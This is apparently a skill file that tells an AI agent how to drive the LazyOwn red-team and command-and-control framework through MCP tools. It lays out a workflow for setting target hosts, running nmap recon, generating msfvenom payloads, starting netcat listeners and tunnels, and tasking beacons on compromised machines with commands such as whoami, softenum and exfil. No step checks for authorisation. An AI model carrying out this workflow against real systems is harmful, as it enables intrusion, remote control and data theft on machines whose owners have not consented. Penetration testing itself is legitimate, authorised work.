# LazyOwn Framework — Skill

You are operating the **LazyOwn** red-team framework via its MCP tools.
LazyOwn is a penetration testing / C2 framework located at `/home/grisun0/LazyOwn`.

## Available MCP Tools

| Tool | Purpose |
|------|---------|
| `lazyown_run_command` | Run any LazyOwn shell command (list, set, nmap, etc.) |
| `lazyown_get_config` | Read current payload.json settings |
| `lazyown_set_config` | Update payload.json settings |
| `lazyown_list_modules` | Show all modules in modules/ |
| `lazyown_get_beacons` | List beacons connected to the C2 |
| `lazyown_c2_command` | Task a specific beacon |
| `lazyown_run_api` | Run a command on the C2 host via REST |
| `lazyown_list_sessions` | Browse the sessions/ directory |
| `lazyown_read_session_file` | Read a file from sessions/ |
| `lazyown_c2_status` | Check C2 health and dashboard data |

## Workflow

### 1. Configure a target
```
lazyown_set_config({"lhost": "10.10.14.5", "rhost": "10.10.11.78", "lport": 4444})
```

### 2. Run recon
```
lazyown_run_command("lazynmap")
lazyown_run_command("hosts_discover")
```

### 3. Generate a payload
```
lazyown_run_command("venom")
lazyown_run_command("payload")
```

### 4. Interact with beacons (requires C2 running)
```
lazyown_get_beacons()
lazyown_c2_command(client_id="abc123", command="whoami")
lazyown_c2_command(client_id="abc123", command="softenum")
lazyown_c2_command(client_id="abc123", command="exfil")
```

### 5. Review session data
```
lazyown_list_sessions()
lazyown_read_session_file("logs/abc123.log")
```

## Common LazyOwn Shell Commands

```
list                     — show all commands
set <key> <value>        — update a parameter (also writes payload.json)
payload                  — show current payload settings
lazynmap                 — full nmap recon against rhost
venom                    — generate msfvenom payload
msf                      — launch Metasploit listener
nc                       — start netcat listener
ligolo                   — set up Ligolo tunnel
chisel                   — set up chisel tunnel
report                   — generate HTML/PDF report via AI
adversary <id>           — emulate MITRE ATT&CK technique
tools list               — list custom tools
```

## Notes
- The LazyOwn shell is cmd2-based; commands are fed via stdin.
- The C2 REST API runs on `https://<lhost>:<c2_port>` (self-signed TLS).
- Configuration lives in `payload.json` — always call `lazyown_get_config` first.
- Session data (logs, exfil, screenshots) is stored under `sessions/`.
